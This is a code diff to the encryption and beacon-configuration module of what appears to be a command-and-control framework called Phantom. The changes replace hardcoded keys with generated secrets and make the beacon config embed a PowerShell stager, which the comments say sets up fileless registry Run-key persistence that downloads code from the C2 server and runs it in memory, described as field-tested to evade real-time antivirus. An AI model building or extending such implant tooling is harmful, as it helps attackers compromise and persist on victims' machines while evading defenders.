@@ -1,29 +1,69 @@
 """Shared C2 encryption key material and authenticated encryption (AES-GCM)."""
 import hashlib
-import os
+import os as _os
 import base64
+import secrets as _secrets
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-from dotenv import load_dotenv
 
-# Load environment variables
-load_dotenv()
+from phantom.utils.state import get_secret, regenerate_secret
 
-DEFAULT_AES_KEY = b"PhantomC2_SecretKey_32bytes_Long"
-DEFAULT_AES_NONCE = b"PhntmNonce12"  # 12 bytes for GCM
+
+def _aes_key() -> str:
+    return get_secret("PHANTOM_C2_KEY", lambda: _secrets.token_hex(16))
+
+
+def _aes_nonce_value() -> str:
+    return get_secret("PHANTOM_C2_NONCE", lambda: _secrets.token_hex(6))
+
+
+def _derive_to_length(raw: bytes, target_len: int) -> bytes:
+    """Normalise a key value to exactly *target_len* bytes.
+
+    - Exact length → return as-is.
+    - 2× target-length hex → decode.
+    - Otherwise → SHA-256 digest truncated / padded to target_len.
+    """
+    if len(raw) == target_len:
+        return raw
+    # hex-encoded?
+    if len(raw) == target_len * 2 and all(c in b"0123456789abcdefABCDEF" for c in raw):
+        try:
+            return bytes.fromhex(raw.decode())
+        except ValueError:
+            pass
+    # base64-encoded?  (len == ceil(target_len * 4/3) without padding)
+    import base64 as _b64
+    try:
+        decoded = _b64.b64decode((raw + b"=" * (-len(raw) % 4)).decode("ascii"))
+        if len(decoded) == target_len:
+            return decoded
+    except (ValueError, UnicodeDecodeError):
+        pass
+    # Last resort: deterministic derivation — still unique per-provided-value.
+    return hashlib.sha256(raw).digest()[:target_len]
 
 
 def get_aes_key() -> bytes:
-    key = os.getenv("PHANTOM_C2_KEY", "").encode()
-    return key if len(key) == 32 else DEFAULT_AES_KEY
+    value = _aes_key()
+    return _derive_to_length(value.encode(), 32)
 
 
 def get_aes_nonce() -> bytes:
-    nonce = os.getenv("PHANTOM_C2_NONCE", "").encode()
-    return nonce if len(nonce) == 12 else DEFAULT_AES_NONCE
+    value = _aes_nonce_value()
+    return _derive_to_length(value.encode(), 12)
 
 
 def get_payload_token() -> str:
-    return os.getenv("PHANTOM_PAYLOAD_TOKEN", "PhantomDefaultToken")
+    return get_secret("PHANTOM_PAYLOAD_TOKEN", lambda: _secrets.token_urlsafe(32))
+
+
+def get_api_token() -> str:
+    return get_secret("PHANTOM_API_TOKEN", lambda: _secrets.token_urlsafe(32))
+
+
+def regenerate_api_token() -> str:
+    """Rotate the API token and return the new value."""
+    return regenerate_secret("PHANTOM_API_TOKEN", lambda: _secrets.token_urlsafe(32))
 
 
 def encrypt_data(plaintext: str) -> str:
@@ -32,26 +72,22 @@ def encrypt_data(plaintext: str) -> str:
     """
     try:
         aesgcm = AESGCM(get_aes_key())
-        nonce = os.urandom(12)
-        # AESGCM.encrypt appends the 16-byte tag to the ciphertext.
+        nonce = _os.urandom(12)
         ciphertext = aesgcm.encrypt(nonce, plaintext.encode(), None)
-        # Prepend nonce so every encryption uses a unique nonce
         return base64.b64encode(nonce + ciphertext).decode()
     except Exception:
         return ""
 
 
 def decrypt_data(ciphertext_b64: str) -> str:
-    """Decrypt base64-encoded AES-256-GCM ciphertext that includes a prepended nonce."""
+    """Decrypt base64-encoded AES-256-GCM ciphertext with prepended nonce."""
     try:
-        raw = base64.b64decode(ciphertext_b64)
-        if len(raw) < 12:
+        raw = base64.b64decode(ciphertext_b64, validate=True)
+        if len(raw) < 12 + 16:
             return ""
-        nonce = raw[:12]
-        ciphertext = raw[12:]
+        nonce, ciphertext = raw[:12], raw[12:]
         aesgcm = AESGCM(get_aes_key())
-        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
-        return plaintext.decode()
+        return aesgcm.decrypt(nonce, ciphertext, None).decode()
     except Exception:
         return ""
 
@@ -66,17 +102,36 @@ def _bytes_to_c_array(data: bytes) -> str:
     return ", ".join(f"0x{b:02x}" for b in data)
 
 
-def write_beacon_c2_config(beacon_dir: str, host: str = "127.0.0.1", port: int = 8080, use_ssl: bool = True) -> str:
-    """Generate c2_config.h from the given C2 host/port/ssl for beacon compilation."""
-    src_dir = os.path.join(beacon_dir, "src")
-    os.makedirs(src_dir, exist_ok=True)
-    path = os.path.join(src_dir, "c2_config.h")
-    ssl_val = "1" if use_ssl else "0"
+def write_beacon_c2_config(beacon_dir: str, host: str = "127.0.0.1",
+                           port: int = 8080, use_ssl: bool = True,
+                           ps_stager_b64: str = "") -> str:
+    """Generate c2_config.h from C2 host/port/ssl for beacon compilation.
+
+    Also embeds the compact PowerShell stager (``C2_PS_STAGER_B64``) so the
+    beacon's persistence command can install a NO-DISK RunKey: at logon the
+    stager re-downloads the XOR PIC from /x and runs it in-memory, a path
+    field-tested to survive real-time AV (the on-disk PE gets execution-
+    blocked). The stager is generated by ``phantom.utils.builder`` (which
+    owns dropper generation) and passed in here to avoid a circular import.
+    Pass ``ps_stager_b64=""`` to fall back to classic PE persist.
+    """
+    src_dir = _os.path.join(beacon_dir, "src")
+    _os.makedirs(src_dir, exist_ok=True)
+    path = _os.path.join(src_dir, "c2_config.h")
     content = f"""#pragma once
 // Auto-generated by phantom.utils.c2_crypto — do not edit manually.
 #define C2_HOST "{host}"
 #define C2_PORT {port}
-#define C2_USE_HTTPS {ssl_val}
+#define C2_USE_HTTPS {1 if use_ssl else 0}
+#define C2_PAYLOAD_TOKEN "{get_payload_token()}"
+// No-disk persistence stager (powershell one-liner, base64): the RunKey
+// launches THIS instead of an on-disk EXE, so nothing malicious sits on
+// disk. Empty = fall back to classic PE persistence.
+#define C2_PS_STAGER_B64 "{ps_stager_b64}"
+{"#define C2_HAS_PS_STAGER 1" if ps_stager_b64 else ""}
+#if __has_include("beacon_auth.h")
+#include "beacon_auth.h"
+#endif
 """
     with open(path, "w", encoding="utf-8") as f:
         f.write(content)
@@ -84,12 +139,11 @@ def write_beacon_c2_config(beacon_dir: str, host: str = "127.0.0.1", port: int =
 
 
 def write_beacon_crypto_config(beacon_dir: str) -> str:
-    """Generate crypto_config.h from environment for beacon compilation."""
-    src_dir = os.path.join(beacon_dir, "src")
-    os.makedirs(src_dir, exist_ok=True)
-    path = os.path.join(src_dir, "crypto_config.h")
-    key = get_aes_key()
-    nonce = get_aes_nonce()
+    """Generate crypto_config.h for beacon compilation."""
+    src_dir = _os.path.join(beacon_dir, "src")
+    _os.makedirs(src_dir, exist_ok=True)
+    path = _os.path.join(src_dir, "crypto_config.h")
+    key, nonce = get_aes_key(), get_aes_nonce()
     content = f"""#pragma once
 // Auto-generated by phantom.utils.c2_crypto — do not edit manually.
 static const unsigned char AES_KEY[]   = {{ {_bytes_to_c_array(key)} }};
@@ -97,4 +151,4 @@ static const unsigned char AES_NONCE[] = {{ {_bytes_to_c_array(nonce)} }};
 """
     with open(path, "w", encoding="utf-8") as f:
         f.write(content)
-    return path
+    return path
